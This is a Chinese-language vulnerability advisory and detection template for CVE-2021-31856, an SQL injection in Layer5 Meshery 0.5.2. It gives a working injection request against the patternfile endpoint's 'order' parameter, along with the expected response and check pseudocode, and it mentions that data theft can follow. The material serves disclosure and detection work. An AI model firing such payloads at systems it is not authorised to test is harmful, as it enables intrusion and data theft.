# Layer5 Meshery 0.5.2 SQL 注入漏洞（CVE-2021-31856）

## 漏洞简介
Layer5 Meshery 0.5.2 存在 SQL 注入漏洞，攻击者可通过 REST API 的 `/experimental/patternfile` 接口的 `order` 参数注入恶意 SQL 语句，进而执行任意 SQL 命令，造成敏感信息泄露、数据篡改等严重后果。

## 影响范围
- 受影响产品：Layer5 Meshery 0.5.2
- CPE: `cpe:2.3:a:layer5:meshery:0.5.2:*:*:*:*:*:*:*`

## 漏洞原理
后端接口未对 `order` 参数进行有效过滤，直接拼接到 SQL 查询语句，导致攻击者可通过构造特殊参数实现 SQL 注入。

## 利用方式与攻击流程
1. 攻击者向 `/api/experimental/patternfile` 接口发送带有恶意 `order` 参数的 GET 请求。
2. 通过如 `select(md5(999999999))` 等注入语句，利用响应内容回显注入结果，确认漏洞存在。
3. 若验证成功，攻击者可进一步利用漏洞进行数据窃取、篡改等操作。

## 探测原理与流程
### 请求包示例
```http
GET /api/experimental/patternfile?order=id%3Bselect(md5(999999999))&page=0&page_size=0 HTTP/1.1
Host: target.com
```

### 响应示例
```http
HTTP/1.1 200 OK
...
e150a1ec81e8e92a4a1508a4c0a3cfa5
```

### 判定逻辑
- 响应状态码为 200。
- 响应体中包含 `e150a1ec81e8e92a4a1508a4c0a3cfa5`（即 `md5(999999999)` 的值）。

### 伪代码
```python
send_get(
    url="/api/experimental/patternfile?order=id%3Bselect(md5(999999999))&page=0&page_size=0"
)
if response.status_code == 200 and "e150a1ec81e8e92a4a1508a4c0a3cfa5" in response.text:
    print("存在 SQL 注入漏洞")
```

### Mermaid 流程图
```mermaid
flowchart TD
    A[开始] --> B[构造注入请求]
    B --> C[发送 GET 请求]
    C --> D{响应状态码是否为 200?}
    D -- 否 --> E[不存在漏洞]
    D -- 是 --> F{响应体是否包含 md5(999999999)?}
    F -- 否 --> E
    F -- 是 --> G[存在 SQL 注入漏洞]
```

## 参考链接
- [CVE-2021-31856 漏洞分析](https://github.com/ssst0n3/CVE-2021-31856)
- [NVD 官方漏洞库](https://nvd.nist.gov/vuln/detail/CVE-2021-31856)
- [Meshery 官网](https://meshery.io)
- [修复 PR](https://github.com/layer5io/meshery/pull/2745)
- [ssst0n3/my_vulnerabilities](https://github.com/ssst0n3/my_vulnerabilities) 